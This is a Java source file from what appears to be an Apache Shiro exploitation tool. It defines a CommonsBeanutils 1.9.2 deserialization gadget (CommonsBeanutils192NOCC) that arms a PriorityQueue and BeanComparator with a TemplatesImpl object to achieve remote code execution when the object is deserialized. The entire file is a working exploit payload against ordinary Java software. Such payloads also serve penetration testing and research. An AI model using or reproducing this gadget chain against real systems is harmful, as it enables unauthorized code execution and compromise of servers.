package com.sma11new.exp.shiro.attack.payloads;

import com.sma11new.exp.shiro.attack.payloads.annotation.Dependencies;
import com.sma11new.exp.shiro.attack.util.Reflections;
import org.apache.commons.beanutils.BeanComparator;
import java.util.PriorityQueue;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
public class CommonsBeanutils192NOCC implements ObjectPayload<Object> {

    public static void main(final String[] args) throws Exception {
        // PayloadRunner.run(CommonsBeanutils192NOCC.class, args);
    }

    public Object getObject(Object template) throws Exception {
        // final Object template = Gadgets.createTemplatesImpl(command);
        // mock method name until armed
        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);

        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        // queue.add(new BigInteger("1"));
        // queue.add(new BigInteger("1"));
        queue.add("1");
        queue.add("1");

        // switch method called by comparator
        Reflections.setFieldValue(comparator, "property", "outputProperties");

        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = template;
        queueArray[1] = template;

        return queue;
    }
}
